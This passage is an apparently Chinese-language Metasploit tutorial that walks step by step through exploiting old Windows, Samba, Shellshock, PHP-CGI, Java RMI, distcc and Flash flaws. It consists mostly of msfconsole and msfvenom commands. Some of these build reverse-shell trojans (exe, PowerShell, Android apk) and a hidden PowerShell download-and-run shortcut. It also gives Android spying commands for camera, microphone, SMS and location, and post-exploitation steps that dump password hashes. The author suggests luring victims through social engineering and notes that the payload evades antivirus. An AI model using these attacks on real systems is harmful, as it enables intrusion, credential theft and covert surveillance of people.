reverse_tcp:反向连接到攻击者主机并创建一个shell<br>bind_tcp:监听一个tcp连接。<br>reverse_tcp:反向建立tcp连接。<br>reverse_http通过HTTP隧道通信并创建一个新用户添加到管理组。<br>add_user创建一个新用户并添加到管理组。<br>xxx_ipv6_tcp:基于IPV6<br>xxx_nonx_tcp:no execute或win7 ( NX是应用在CPU的一种可以防止缓冲区溢出的技术)<br>xxx_ord_tcp:有序payload。<br>xxx_tcp_allports:在所有可能的端口。</p>        <h1 id="五-MSF漏洞实例测试">          <a href="#五-MSF漏洞实例测试" class="heading-link"><i class="fas fa-link"></i></a>五.MSF漏洞实例测试</h1>      <p>三种攻击实例</p>        <h2 id="5-1-网络服务器攻击渗透（MS08-067">          <a href="#5-1-网络服务器攻击渗透（MS08-067" class="heading-link"><i class="fas fa-link"></i></a>5.1.网络服务器攻击渗透（MS08_067)</h2>      <p>用到的靶机：WinXPenSP3</p><p>首先，执行msfconsole命令：msfconsole</p><p>接着，搜索ms08_067目录：search ms08_067</p><p>然后，</p>        <h2 id="5-2-浏览器攻击渗透（MS10-018">          <a href="#5-2-浏览器攻击渗透（MS10-018" class="heading-link"><i class="fas fa-link"></i></a>5.2.浏览器攻击渗透（MS10_018)</h2>      <p>用到的靶机：WinXPenSP3</p><p>首先，执行msfconsole命令：msfconsole</p><p>接着，搜索ms10_018目录,搜索模块路径：search ms10_018</p><p>然后，进入搜索到的模块：use + 模块路径</p><p>查看该模块使用以及会影响win的详细信息：show options</p><p>设置自己服务器IP：set SRVHOST + IP地址(这里就填kali的IP，一般来说填公网IP地址)</p><p>设置一下端口，为了方便识别：例如：set LPORT 4441</p><p>设置一个payload正向连接shell：例如：set PAYLOAD windows/meterpreter/bind_tcp</p><p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）</p><p>run 一下，会有一个 url 地址，这个地址就是要通过社工等方法让目标机进行访问（抛出一个诱导，让肉机访问）（当肉机点击访问后，我们就有可能得到肉机的系统权限）</p><p>查看我们得到的肉机信息：sessions -i</p><p>进入肉机系统：sessions -i +肉机编号（看有多少台机器上钩）</p>        <h2 id="5-3-应用软件格式渗透，利用word去渗透（MS10-087">          <a href="#5-3-应用软件格式渗透，利用word去渗透（MS10-087" class="heading-link"><i class="fas fa-link"></i></a>5.3.应用软件格式渗透，利用word去渗透（MS10_087)</h2>      <p>用到的靶机：WinXPenSP3</p><p>首先，执行msfconsole命令：msfconsole</p><p>接着，搜索ms10_087目录,搜索模块路径：search ms10_087</p><p>然后，使用这个模块：use + 模块及它的路径</p><p>查看该模块使用以及会影响win的详细信息：show options（看看要设置哪些信息）</p><p>设置需要设置的信息，显然这个模块要设置文件名（如果不设置就是保持它原本的默认名）</p><p>设置一个payload，前面我们都是设置的交互式的，这里我们换一个payload：例如：set payload windows/exec</p><p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）,这里也会提示我们还要设置什么payload选项</p><p>这里出现还要我们设置CMD：这是处于win类似元终端执行的命令，比如我们执行弹出一个计算器：set CMD calc.exe</p><p>run一下，我们就会得到word文档，就是我们之前自己设计的文件名，它会告诉我们生成文件的位置</p><p>然后我们可以把它拷贝到home里：home:mv +文件路径/home/，然后再托到本机，就可以看出效果了</p>        <h2 id="5-4-网路服务器攻击渗透测试（MS17-010">          <a href="#5-4-网路服务器攻击渗透测试（MS17-010" class="heading-link"><i class="fas fa-link"></i></a>5.4.网路服务器攻击渗透测试（MS17_010)</h2>      <p>用到的靶机：Win7</p><p>首先，执行msfconsole命令：msfconsole</p><p>接着，搜索ms17_010目录,搜索模块路径：search ms17_010（这个就是之前的永恒之蓝）</p><p>然后，使用这个模块：use + 模块及它的路径</p><p>查看该模块使用以及会影响win的详细信息：show options（看看要设置哪些信息）</p><p>设置需要设置的信息：set RHOST，LHOST(这个不是必须设置的，要求上没有它，但是还是设置一下)</p><p>设置一个payload，设置一个64位的：set payload windows/x64/meterpreter/reverse_tcp（反向连接，只要被攻击机存在漏洞时，就会反向连接到攻击机上）</p><p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）,这里也会提示我们还要设置什么payload选项。</p><p>run一下，当我们进入了meterpreter模式，就说明我们拿到了shell，shell 一下，我们就直接进入到别人的系统</p>        <h2 id="5-5-利用-samba-服务漏洞入侵-Linux-主机（CVE-2017-7494-与-samba-低版本漏洞利用）">          <a href="#5-5-利用-samba-服务漏洞入侵-Linux-主机（CVE-2017-7494-与-samba-低版本漏洞利用）" class="heading-link"><i class="fas fa-link"></i></a>5.5.利用 samba 服务漏洞入侵 Linux 主机（CVE-2017-7494 与 samba 低版本漏洞利用）</h2>      <p>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件 ，由服务器及客户端程序构成samba服务对应的端口有139，445等等。本文将简单介绍metasploit利用samba漏洞入侵进入远程linux主机。</p><ol><li><p>首先要扫描目标主机上开放的端口和服务,用nmap,命令如下:<br>nmap -sS -Pn -A 192.168.133.133</p></li><li><p>发现主机上开放的139 , 445端口之后,说明该主机有可能存在samba服务远程溢出漏河，尝试通过该端口建立一个meterpreter会话，需要用到metasploit。</p></li><li><p>打开metasploit之后需要先判断samba的版本，命令如下:</p><p>msf&gt; search auxiliary/scanner/samba </p><p>这条命令用来查找samba相关exploit 参数</p></li><li><p>然后使用如下命令来定义要扫描samba的版本所用到的exploits参数</p><p>msf&gt; use auxiliary/scanner/smb/smb_version</p><p>msfauxiliary(smb_version) &gt; set RHOSTS 192.168.133.xxx（这两步是扫描这个肉鸡是否能被攻击）</p><p>这条命令定义你将要扫描samba版本的远程主机的IP地址。</p><p>exploit  ：开始漏洞利用</p></li><li><p>发现samba版本之后,我们需要进一步利用来入侵进入到远程linux主机</p><p>msf&gt; use exploit/multi/samba/usermap_script<br>msf exploit(usermap_script) &gt; set RHOST 192.168.133.xxx</p><p>msf exploit(usermap script) &gt; exploit</p><p>执行完成以上命令如图所示,成功创建了shell 会话。</p></li></ol><p>（二）smb 其他漏洞 Linux smb 漏洞（CVE-2017-7494）复现</p><p>漏洞编号： CVE-2017- 7494.<br>漏洞等级：严重<br>影响版本：漏洞影响了Samba 3.5.0之后的版本，不包含4.6.4/4.5.10/4.4.14</p><ol><li><p>查看samba版本</p><p>samba -V     #查看samba版本</p></li><li><p>打开samba配置文件添加以下配置，配置共享：</p><p>vi /etc/samba/smb.conf</p><p>在末行加入：</p><p>[public]</p><pre><code>comment = publicbrowseable = yeswriteable =yespath = /tmp/publicpublic = yesread only = no</code></pre><p>:wq  #保存退出</p></li><li><p>Kali Linux 2017里面创建Samnba共享目录，创建共享目录</p><p>创建共享目录：mkdir /tmp/public</p><p>修改执行读写权限：chmod 777 /tmp/public/</p><p>这是 SambaCry 漏洞利用的前提，必须有一个共享目录，这样攻击者就可以在共享目录下传递攻击代码并执行，获得root 权限并控制肉鸡。</p></li><li><p>Kali Linux 2017 重启/ 启动 Samba 服务</p><p>重启 Samba 服务：/etc/init.d/samba restart</p><p>查看 Samba 进程：ps aux | grep samba</p><p>查看Samba 端口状态：netstat -tnlp samba（采用445和139端口）</p></li><li><p>更新MSF 后使用”exploit/linux/samba/is_known_pipename”利用模块，设置 rhost 后直接 exploit 即可得到 shell</p></li></ol><p>注意：有的 poc 会存在32位和64位之分，1-4的步骤是在肉鸡上的操作（被攻击的Linux机）</p>        <h2 id="5-6-Bash-Shellshock-CVE-2014-6271（破壳）">          <a href="#5-6-Bash-Shellshock-CVE-2014-6271（破壳）" class="heading-link"><i class="fas fa-link"></i></a>5.6.Bash Shellshock CVE_2014_6271（破壳）</h2>      <p>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞。启动Bash的时候不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些CGI脚本的设计中,数据是通过环境变量来传递的,这样就给了数据提供者利用Shellshock漏洞的机会。</p><p>简单来说就是由于服务器的cgi脚本调用了bash命令,由于bash版本过低,攻击者把有害数据写入环境变量,传到服务器端,触发服务器运行Bash脚本,完成攻击。</p><p><strong>本次实战环境：</strong></p><p>metasploitable2 是一个非常不错的靶机 ,内置了多种漏洞来练习你的黑客技术。我将在独立网络环境中使用kali来攻击它,建议你也跟我一样, 确保在第一次尝试攻击时结果和我一样，等技术娴熟后就可以渗透真实的机器了。</p><ol><li><p>第一步：配置靶机</p><p>要利用此漏洞，要在 cgi-bin 目录下有一个可执行脚本，一个简单的输出 ”hello world ”脚本即可，因为仅仅是作为演示，进入靶机的 /usr/lib/cgi-bin/ 目录下，输入以下命令：</p><p>命令：sudo nano hello.sh</p><p>输入正确的密码后，对hello.sh 进行编辑：</p><p>#! /bin/bash</p><p>echo “Content-type:text/html”</p><p>echo “”</p><p>echo “Hello World !”</p><p>保存好后，赋予脚本可执行权限，用 chmod 命令：sudo chmod 775 hello.sh</p><p>我们来验证以下，通过浏览器访问该脚本，可以看到已经成功执行:192.168.133.139/cgi-bin/hello.sh</p></li><li><p>第二步：准备攻击</p><p>在kali中，进入 metasploit ：msfconsole</p><p>我们可以通过 search 来搜索 exploits ，输入search shellshock ,这样就能搜索到 apache_mod_cgi_bash_env_exec 模块</p><p>输入 ：show options 来查看该模块要配置的东西</p><p>大部分是选择默认配置，这里只要配置远程 RHOSTS ，本地监听的IP  LHOST和文件路径 targeturi ：set targeturi /cgi-bin/hello.sh</p><p>设置了本地IP LHOST，就得设置payload ，命令：set payload linux/x86/shell/reverse_tcp</p></li><li><p>第三步：getshell</p><p>一些 metasploit 模块有一个非常便利的小功能，就是检测靶机是否有漏洞，输入 check 命令检测即可，这将会把靶机是否存漏洞检测出来。</p><p>输入：exploit 命令进行攻击</p></li></ol>        <h2 id="5-7-PHP-CGI-漏洞利用">          <a href="#5-7-PHP-CGI-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a>5.7.PHP CGI 漏洞利用</h2>      <p>一般通过 phpinfo 来查看是否符合CGI漏洞利用，通常看 Server API ：CGI / *，CGI是服务器的扩展功能（比如：留言板提交，IIS/Windows 的php 要用到）</p><p>靶机：metasploitable2</p><p>命令：</p><p>msf &gt; search cve:2012-1823</p><p>msf &gt; use exploit/multi/http/php_cgi_arg_injection</p><p>msf exploit(php_cgi_arg_injection) &gt;show options</p><p>msf exploit(php_cgi_arg_injection) &gt; set RHOSTS 192……</p><p>msf exploit(php_cgi_arg_injection) &gt; run(或者exploit)</p>        <h2 id="5-8-Java-RMI-SERVER-命令执行漏洞与-java-cve-2013-0422">          <a href="#5-8-Java-RMI-SERVER-命令执行漏洞与-java-cve-2013-0422" class="heading-link"><i class="fas fa-link"></i></a>5.8.Java RMI SERVER 命令执行漏洞与 java cve_2013_0422</h2>      <p>Java RMI SERVER 的 RMI 注册表 和 RMI 激活服务的默认配置存在安全漏洞，导致代码执行</p><p>利用步骤：</p><p>nmap -p0-65535 IP，查看 1099 端口是否开启</p><p>msf &gt; use exploit/muti/misc/java_rmi_server</p><p>msf exploit(java_rmi_server) &gt; set RHOSTS IP</p><p>msf exploit(java_rmi_server) &gt; exploit</p><p>meterpreter &gt;shell</p><p><strong>二. java cve:2013-0422</strong></p>        <h2 id="5-9-Distcc-后门漏洞利用">          <a href="#5-9-Distcc-后门漏洞利用" class="heading-link"><i class="fas fa-link"></i></a>5.9. Distcc 后门漏洞利用</h2>      <p>安全组织索引：CVE-2004-2678，OSVDB-13378</p><p>Distcc 用于大量代码在网络服务器上的分布式编译,但是如果配置不严格，容易被滥用执行命令，该漏洞是Xcode 1.5 版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制</p><p>利用步骤:<br>启动 metasploit</p><p>使用 exploit/unix/misc/distcc_exec 模块</p><p>set RHOSTS IP</p><p>exploit 执行攻击</p><p>id 查看权限， uname -a 验证</p>        <h2 id="5-10-Druby-命令执行">          <a href="#5-10-Druby-命令执行" class="heading-link"><i class="fas fa-link"></i></a>5.10.Druby 命令执行</h2>      <p>Druby 配置不当，被滥用执行命令。（Druby 是开发语言，后缀名 .rb）</p><p>利用步骤：</p><p>metasploit 启动</p><p>发现 8787 druby 端口</p><p>search drb 搜索drb 相关漏洞，找最新模块并利用 use </p><p>set URL druby:IP:8787    # 设置目标druby链接    ：druby://ip地址：8787（可设置可不设置，有可能设置后还攻击不了）</p><p>set RHOSTS IP</p><p>exploit   攻击</p>        <h2 id="5-11-CVE-2017-8464-震网三代-（远程快捷方式漏洞）">          <a href="#5-11-CVE-2017-8464-震网三代-（远程快捷方式漏洞）" class="heading-link"><i class="fas fa-link"></i></a>5.11. CVE_2017_8464 震网三代 （远程快捷方式漏洞）</h2>      <p><strong>漏洞详情:</strong><br>北京时间2017年6月13日凌晨，微软官方发布6月安全补丁程序，“震网三代” LNK 文件远程代码执行漏洞(CVE-2017-8464)和Windows搜索远程命令执行漏洞(CVE-2017-8543) </p><p>CVE-2017-8543,当Windows搜索处理内存中的对象时，存在远程执行代码漏洞。成功利用此漏洞的攻击者可以控制受影响的系统。</p><p>CVE-2017-8464,当Windows系统在解析快捷方式时，存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危。</p><p>攻击机：kali</p><p>靶机：win7</p><p>受影响的版本：win7，win8.1，win RT 8.1，win10，win Server 2008，win Server 2008 R2，win Server 2012，win Server 2012 R2，win Server 2016</p><p><strong>步骤：</strong></p><p>search 2017_8464</p><p>use exploit/windows/fileformat/cve_2017_8464_lnk_rce</p><p>set LHOST </p><p>run</p><p>它会生成以一堆快捷方式，我们要先把它们拷到 home 下，再拷到 window里（肉鸡）：mv /…/ /home</p><p>然后，再msf中设置监听：</p><p>search multi/handler</p><p>use exploit/multi/handler</p><p>set payload windows/meterpreter/reverse_tcp</p><p>set LHOST</p><p>run </p><p>等待wins 点击快捷方式，当反shell 后会自动到 meterpreter 模式</p><p><strong>payload2：利用powershell 快捷键</strong></p><p>生成攻击文件，终端输入：</p><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=ip -f psh-reflection&gt;/opt/search.psl(exe类型的也可以)</p><p>然后，将 /opt/目录下的 search.psl 移到 /var/www/html/ 下：mv /opt/search.psl /var/www/html</p><p>随后打开 Apache 服务：service apache2 start</p><p>通过 web 访问 search.psl 文件 ：192.168.133.128/search.psl</p><p>然后，在目标机器windows 上建一个快捷方式：</p><p>右击新建快捷方式，输入的对象位置：powershell -windowstyle hidden -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<span class="exturl"><a class="exturl__link" href="http://192.168.133.128/search.psl&#39;);test.psl&quot;">http://192.168.133.128/search.psl&#39;);test.psl&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>或者用工具：shortcut exploit builder</p>        <h2 id="5-12-flash-0day-CVE-2018-4878">          <a href="#5-12-flash-0day-CVE-2018-4878" class="heading-link"><i class="fas fa-link"></i></a>5.12. flash 0day (CVE-2018-4878)</h2>      <p><strong>漏洞详情：</strong></p><p>Adobe公司在当地时间2018年2月1日发布了一条安全公告:<span class="exturl"><a class="exturl__link" href="http://helpx.adobe.com/security/products/flash-player/apsa18-01.html%E3%80%82%E5%85%AC%E5%91%8A%E7%A7%B0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84Flash">http://helpx.adobe.com/security/products/flash-player/apsa18-01.html。公告称一个新的Flash</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 0Day漏洞(CVE-2018-4878)已经存在野外利用，可针对Windows用户发起定向攻击。攻击者可以诱导用户打开包含恶意Flash代码文件的Microsoft Office文档、 网页、垃圾电子邮件等。</p><p><strong>漏洞影响：</strong></p><p>Flash Player 28.0.0.137 及其以前的所有版本</p><p><strong>漏洞复现：</strong></p><p>攻击机：kali</p><p>目标靶机：win7 + IE8.0 + Flash Player 28.0.0.137</p><ol><li><p>下载 cve-2018-4878 步骤：</p><p> <span class="exturl"><a class="exturl__link" href="https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar">https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> （win7 中下载）</p></li><li><p>解压文件后可以看到 cve-2018-4878.py 和 exploit.swf ，我们只需要 cve-2018-4878.py</p></li><li><p>我们需要对 cve-2018-4878.py 进行修改，原作者将 stageless 变量改为了 Ture ,我们要把它改为 stageless = False，另外不能忘记修改最后的路径，py 中是 f=open(“root/2/index.html”,”wb”)，我们 kali 中没有这个路径，所以在 kali 中要创建一个：mkdir /root/2/</p></li><li><p>在 kali 中生成 msf 的 shellcode （一定要注意：在老版本的kali 中生成的为333字节的 payload）</p><p>命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.133.128 lport=4444 -f python&gt;shellcode.txt</p></li><li><p>然后要替换原来的 shellcode ,就是把生成的 shellcode.txt 里面的代码替换到 cve-2018-4878.py 中</p></li><li><p>接着，把cve-2018-4878.py 放到 /root/2 的文件夹里</p></li><li><p>在kali 中执行 cve-20018-4878.py 这个脚本，即可在同一目录下生成恶意的 swf 文件</p></li><li><p>然后，将生成的文件放到 win7 中，用IE 浏览器打开</p></li><li><p>在 msf 中设置监听</p><p>use exploit/multi/handler</p><p>set payload windows/meterpreter/reverse_tcp </p><p>set LHOST,LPORT 4444(这个要和先前配置的端口一致)</p><p>exploit</p></li></ol>        <h2 id="5-13-生成-exe-的木马文件">          <a href="#5-13-生成-exe-的木马文件" class="heading-link"><i class="fas fa-link"></i></a>5.13. 生成 exe 的木马文件</h2>      <p>命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.133.128 lport=6789 -f exe -o /root/payload.exe</p><p>这是把木马程序存放于 kali 中，想办法传送到 win 10 中，并让其执行</p><p>设置监听：</p><p>msf&gt; use exploit/multi/handler</p><p>set payload windows/x64/meterpreter/reverse_tcp</p><p>set LHOST 192.168.133.128</p><p>run</p>        <h2 id="5-14-渗透-Android-系统">          <a href="#5-14-渗透-Android-系统" class="heading-link"><i class="fas fa-link"></i></a>5.14. 渗透 Android 系统</h2>              <h3 id="5-14-1-渗透步骤">          <a href="#5-14-1-渗透步骤" class="heading-link"><i class="fas fa-link"></i></a>5.14.1. 渗透步骤</h3>              <h4 id="1-内网渗透">          <a href="#1-内网渗透" class="heading-link"><i class="fas fa-link"></i></a>1. 内网渗透</h4>      <ol><li><p>首先要把 Kali 攻击机 配置为 桥接模式，因为渗透 Android 系统 要在局域网下，所以 kali ，物理机，Android 要在同一网段下，这样三者之间可以互相 ping 通。</p><p>同一个局域网就是要在同一个 WIFI 下。</p></li><li><p>kali 机器要生成攻击脚本：</p><p>命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.111 LPORT=9999 R&gt;/root/test.apk</p><p>生成一个 apk 的脚本后，存放在 root 的目录下，复制到 window中，通过 QQ 发送到手机上，下载安装运行</p></li><li><p>这时，kali 要设置监听：</p><p>进入 msfconsole</p><p>使用 exploit/multi/handler 模块：use exploit/multi/handler</p><p>设置payload：set payload android/meterpreter/reverse_tcp</p><p>设置监听的攻击机 IP：set LHOST 192.168.0.111</p><p>设置监听端口：set LPORT 9999                      （IP 和 端口和上面脚本设置一致）</p><p>渗透：run  /  exploit</p><p>当脚本在手机中被运行时，kali 就会接受到信号，进入 meterpreter 的命令行</p></li></ol>        <h4 id="2-外网渗透">          <a href="#2-外网渗透" class="heading-link"><i class="fas fa-link"></i></a>2. 外网渗透</h4>      <ol><li><p>首先我们需要下载一个用于内网穿透的工具来进行端口映射与转发。</p><p>这里就用 Ngrok ，这个软件可以有免费版的（网速不行，不稳定，自娱自乐吧）</p><p>在官网上注册并登录（<span class="exturl"><a class="exturl__link" href="https://www.ngrok.cc/#down-client%EF%BC%89">https://www.ngrok.cc/#down-client）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></li><li><p>kali进入 ngrok 查看连接状态，命令：</p><p>./sunny clientid 你的id（这个id 在 ngrok 隧道管道中可以看到）</p><p>利用转发的 tcp 和端口号</p></li><li><p>kali 机器要生成攻击脚本：</p><p>命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=free.idcfengye.com LPORT=10227 R&gt;/home/haoye/haoye.apk</p><p>生成一个 apk 的脚本后，存放在 /home/haoye 的目录下，复制到 window中，通过 QQ 发送到手机上，下载安装运行</p></li><li><p>kali 要设置监听（和上面内网渗透设置步骤一样）</p></li></ol><p>Ngrok 注册安装可以看：<span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_45798017/article/details/108564464">https://blog.csdn.net/weixin_45798017/article/details/108564464</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="5-14-2-后期-处理">          <a href="#5-14-2-后期-处理" class="heading-link"><i class="fas fa-link"></i></a>5.14.2. 后期 处理</h3>      <ol><li><p>手机拍照</p><p>webcam_list              #查看摄像头  （1 是后置，2是前置，但是我没看出什么不同）</p><p>webcam_snap 1/2      #拍照</p><p>webcam_stream 1/2   #摄像，录视频</p></li><li><p>手机录音</p><p>record_mic</p></li><li><p>查看Android手机是否已经执行root权限</p><p>check_root</p></li><li><p>导出Android手机的电话本</p><p>dump_contacts</p></li><li><p>导出Android手机的短信记录</p><p>dump_sms</p></li><li><p>远程控制目标手机发送短信</p><p>send_sms -d 其他手机号 -t “内容”</p></li><li><p>对目标手机进行定位，查看目标手机位置信息</p><p>geolocate</p></li><li><p>查看所有可执行命令</p><p>?</p></li></ol><p>优点：该脚本不会报毒</p><p>弊端：上面的操作都得有权限，也就是手机下桌面的这个脚本的信息中的权限光有 “询问” 的权限是不够的，必须是 “允许”。</p>        <h1 id="六-拓展：Auxiliary（辅助）模块">          <a href="#六-拓展：Auxiliary（辅助）模块" class="heading-link"><i class="fas fa-link"></i></a>六.拓展：Auxiliary（辅助）模块</h1>      <p><strong>Auxiliary模块</strong></p><p>情报搜集阶段,这一阶段主要是尽可能多的收集目标的各种信息。这里主要用到Msf里auxiliary里边的Modules，这里的Modules都是一些渗透前期的辅助工具。一般的收集信息可以使用Whois(这个是Linux 自带的)，db_ nmap这个是Msf的一个插件) ,如果要使用到其他的一些收集信息的方法，比如使用Syn(一种不建立头层皮连接的扫描)扫描，可以在Msfconsole里边Search syn然后根据返回结果来确定使用哪个模块。</p><ol><li><p>Whois信息探测：在Mstconsole下使用Whois查看域名(domin) / IP信息。：whois + 域名/IP</p></li><li><p>利用模块查找邮箱：use auxiliary/gather/search_email_collector</p></li><li><p>因为 Google 国内引擎关闭了，所以我们设置不用Google引擎：set SEARCH_GOOGLE false(不关闭的话搜索时间就长一些)，然后 run 进行搜索</p></li><li><p>使用 auxiliary 下的搜索 DNS 的模块：use auxiliary/gather/enum_dns，设置DNS时不要加www，然后 run 进行爆破</p></li></ol>        <h1 id="七-拓展：Nmap-端口扫描-模块">          <a href="#七-拓展：Nmap-端口扫描-模块" class="heading-link"><i class="fas fa-link"></i></a>七. 拓展：Nmap (端口扫描) 模块</h1>      <p>msf 内置 nmap 端口扫描模块，效果和 kali 中自带的 nmap 是一致的</p>        <h2 id="7-1-Syn-扫描">          <a href="#7-1-Syn-扫描" class="heading-link"><i class="fas fa-link"></i></a>7.1 Syn 扫描</h2>      <p>如果TCP 扫描访问被拦截，就可以利用 syn 扫描（不建立连接的扫描）</p><p>扫描器向目标主机的一个端口发送请求连接的 SYN 包，扫描器在收到 SYN / ACK 后，不是发送的 ACK 应答而是发送RST 包请求断开连接。这样，三次握手就没有完成，无法建立正常的 TCP 连接，因此，这次扫描就不会被记录到系统日志中。这种扫描技术一般不会在目标主机上留下扫描痕迹。但是，这种扫描需要有 root 权限。<br>TCP connect 端口扫描服务端与客户端建立连接成功(目标端口开放)</p><p><strong>过程:</strong></p><ol><li>Client 端发送SYN;</li><li>Server端返回SYN/ACK，表明端口开放;（如果返回 RST/ACK 表明端口未开放）</li><li>Client端返回ACK，表明连接已建立；</li><li>Client端主动断开连接。</li></ol><p><strong>优点：</strong></p><p>SYN扫描要比TCP Connect()扫描隐蔽些,SYN仅仅需要发送初始的SYN数据包给目标主机,如果端口开放,则相应SYN-ACK数据包;如果关闭，则响应 RST 数据包。</p><p><strong>步骤：</strong></p><ol><li>use auxiliary/scanner/portscan/syn</li><li>set RHOSTS 192.168.134.1..</li><li>set THREADS 100   #设置线程，默认的是1，这里我们设置成100</li><li>run  进行扫描</li></ol>        <h2 id="7-2-Tcp-扫描">          <a href="#7-2-Tcp-扫描" class="heading-link"><i class="fas fa-link"></i></a>7.2 Tcp 扫描</h2>      <ol><li>use auxiliary/scanner/portscan/tcp</li><li>set RHOSTS</li><li>set THREADS 100</li><li>run 进行扫描</li></ol>        <h1 id="八-服务版本信息探索">          <a href="#八-服务版本信息探索" class="heading-link"><i class="fas fa-link"></i></a>八. 服务版本信息探索</h1>              <h2 id="8-1-SMB-版本扫描">          <a href="#8-1-SMB-版本扫描" class="heading-link"><i class="fas fa-link"></i></a>8.1. SMB 版本扫描</h2>      <ol><li>执行 use auxiliary/scanner/smb/smb_version</li><li>show options  查看要哪些配置</li><li>set RHOSTS IP</li></ol>        <h2 id="8-2-SSH-版本扫描">          <a href="#8-2-SSH-版本扫描" class="heading-link"><i class="fas fa-link"></i></a>8.2. SSH 版本扫描</h2>      <ol><li>执行 use auxiliary/scanner/ssh/ssh_version</li><li>show options  查看需要哪些配置</li><li>set RHOSTS IP</li><li>run</li></ol>        <h2 id="8-3-FTP-版本扫描">          <a href="#8-3-FTP-版本扫描" class="heading-link"><i class="fas fa-link"></i></a>8.3. FTP 版本扫描</h2>      <ol><li>执行 use auxiliary/scanner/ftp/ftp_version</li><li>show options  查看需要哪些配置</li><li>set RHOSTS IP</li><li>run</li></ol>        <h1 id="九-Meterpreter的后期攻击使用方法">          <a href="#九-Meterpreter的后期攻击使用方法" class="heading-link"><i class="fas fa-link"></i></a>九.Meterpreter的后期攻击使用方法</h1>              <h2 id="9-1-上传文件到Windows主机">          <a href="#9-1-上传文件到Windows主机" class="heading-link"><i class="fas fa-link"></i></a>9.1.上传文件到Windows主机</h2>      <p>简单地来说，你可以上传本机的任意文件到目标主机，</p><p>命令：<code>upload&lt;file&gt;&lt;destination&gt;</code>        </p><p>(注意，file是包括它自己的路径的，同时，使用 -r 参数可以递归上传要上传的目录和文件)</p><p>例如：<code>upload -r /home/haoye.exe c:\\</code> （注意，这里要有两个 \ )</p>        <h2 id="9-2-从Windows主机上下载文件">          <a href="#9-2-从Windows主机上下载文件" class="heading-link"><i class="fas fa-link"></i></a>9.2.从Windows主机上下载文件</h2>      <p>download命令可以下载远程主机里的文件</p><p>命令：<code>download&lt;file&gt;&lt;path to save&gt;</code>               例如：<code>download C://haoye.rtf /home</code></p><p>注意：Windows路径要加双斜线，我们如果要递归下载整个目录包括子目录和文件，我们可以使用download -r 的命令</p><p>例如：</p>        <h2 id="9-3-在目标主机上执行-exe-文件">          <a href="#9-3-在目标主机上执行-exe-文件" class="heading-link"><i class="fas fa-link"></i></a>9.3.在目标主机上执行 exe 文件</h2>      <p>我们也可以用 execute 命令在目标主机上执行exe的应用程序</p><p>命令：<code>execute -f &lt;path&gt;[options]</code></p><p>例如：<code>execute -f c:\\haoye.exe</code>(双反斜杠)</p>        <h2 id="9-4-创建CMD新通道">          <a href="#9-4-创建CMD新通道" class="heading-link"><i class="fas fa-link"></i></a>9.4.创建CMD新通道</h2>      <p>如果想在目标主机执行命令提示符</p><p>命令：<code>execute -f cmd -c</code>(这都是在 meterpreter 模式下的操作，类似于 shell 的命令)</p>        <h2 id="9-5-显示进程">          <a href="#9-5-显示进程" class="heading-link"><i class="fas fa-link"></i></a>9.5.显示进程</h2>      <p>ps命令会显示目标主机所有正在运行的进程</p><p>命令：<code>ps</code>  （和windows任务管理器查看内容是一样的）</p>        <h2 id="9-6-获取admin权限">          <a href="#9-6-获取admin权限" class="heading-link"><i class="fas fa-link"></i></a>9.6.获取admin权限</h2>      <p>getsystem命令可以提权到本地系统权限</p><p>命令：<code>getsystem</code></p>        <h2 id="9-7-使用-Hashdump-转储所有-hash-值">          <a href="#9-7-使用-Hashdump-转储所有-hash-值" class="heading-link"><i class="fas fa-link"></i></a>9.7.使用 Hashdump 转储所有 hash 值</h2>      <p>我么可以使用 meterpreter shell 来 dump 目标主机当前系统账户和密码，转储的内容是 NTLM 哈希格式</p><p>NTLM 在线破解 ：<span class="exturl"><a class="exturl__link" href="http://hashkiller.co.uk/ntlm-decrypter.aspx">http://hashkiller.co.uk/ntlm-decrypter.aspx</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>命令：<code>hashdump</code></p><p>输出的每一行格式如下：usrname：ID…..</p><p>它会得到几个不同权限的账号和 hash 密码</p>        <h2 id="9-8-使用-Credcollect-转储-hash-值">          <a href="#9-8-使用-Credcollect-转储-hash-值" class="heading-link"><i class="fas fa-link"></i></a>9.8.使用 Credcollect 转储 hash 值</h2>      <p>还有一个类似的脚本叫 credential_collector ,也可以收集目标主机的 tokens </p><p>命令：<code>run credcollect</code></p>        <h2 id="9-9-创建端口转发">          <a href="#9-9-创建端口转发" class="heading-link"><i class="fas fa-link"></i></a>9.9.创建端口转发</h2>      <p>用途：当对方主机是在内网的情况下</p><p>meterpreter shell中的portfwd命令是转发技术中最常用的一个命令， 可以让攻击系统访问本来无法直接访问的目标主机。<br>add选项会将端口转发添加到列表中，而且本质上会创建一个隧道。</p><p>请注意:这个隧道存在于 meterpreter 控制台之外，任何终端会话都可以使用。</p><p>命令：portfwd add -l 6666 -p 3389 -r 127.0.0.1        #将目标机的3389端口转发到本地6666端口。(本地端口不能被占用)</p>        <h2 id="9-10-删除端口转发">          <a href="#9-10-删除端口转发" class="heading-link"><i class="fas fa-link"></i></a>9.10.删除端口转发</h2>      